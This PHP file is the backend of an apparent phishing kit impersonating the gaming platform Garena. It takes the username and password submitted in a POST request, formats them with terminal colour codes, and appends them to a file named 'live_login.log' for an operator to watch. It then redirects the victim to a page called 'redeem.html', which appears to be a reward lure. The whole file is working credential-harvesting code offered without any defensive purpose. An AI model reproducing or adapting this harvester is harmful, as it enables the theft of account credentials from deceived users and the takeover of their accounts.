<?php 
// Terminal color codes
$BRIGHT_GREEN = "\033[1;92m";
$BRIGHT_CYAN = "\033[1;96m";
$BRIGHT_YELLOW = "\033[1;93m";
$RESET = "\033[0m";

// Get values from POST request
$username = $_POST['username'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';

// Format with color for terminal
$logEntry = "{$BRIGHT_CYAN}Garena {$BRIGHT_YELLOW}Username: {$BRIGHT_GREEN}$username {$BRIGHT_YELLOW}Pass: {$BRIGHT_GREEN}$password{$RESET}\n";

// Save to log file
file_put_contents("live_login.log", $logEntry, FILE_APPEND | LOCK_EX);

// Redirect
header('Location: redeem.html');
exit();